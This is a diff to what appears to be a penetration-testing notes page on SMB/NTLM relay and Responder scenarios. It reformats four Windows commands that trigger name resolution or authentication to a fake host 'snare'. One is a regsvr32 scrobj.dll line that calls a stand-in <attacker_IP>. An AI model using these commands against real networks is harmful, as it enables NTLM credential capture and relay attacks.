@@ -8,10 +8,12 @@ Search Tag(s): #mitm #responder #smb #relay #ntlm #scenarios
 
 ## 1.2 - Target
 
-`C:\> net view \\snare`
+```
+C:\> net view \\snare
 
-`C:\> MpCmdRun.exe -Scan -ScanType 3 -File \\snare\share\file.txt`
+C:\> MpCmdRun.exe -Scan -ScanType 3 -File \\snare\share\file.txt
 
-`PS C:\> Resolve-DnsName -LlmnrOnly Snare 2> $Null`
+PS C:\> Resolve-DnsName -LlmnrOnly Snare 2> $Null
 
-`C:\> regsvr32.exe /s /u /i://<attacker_IP>/@snare scrobj.dll`
+C:\> regsvr32.exe /s /u /i://<attacker_IP>/@snare scrobj.dll
+```
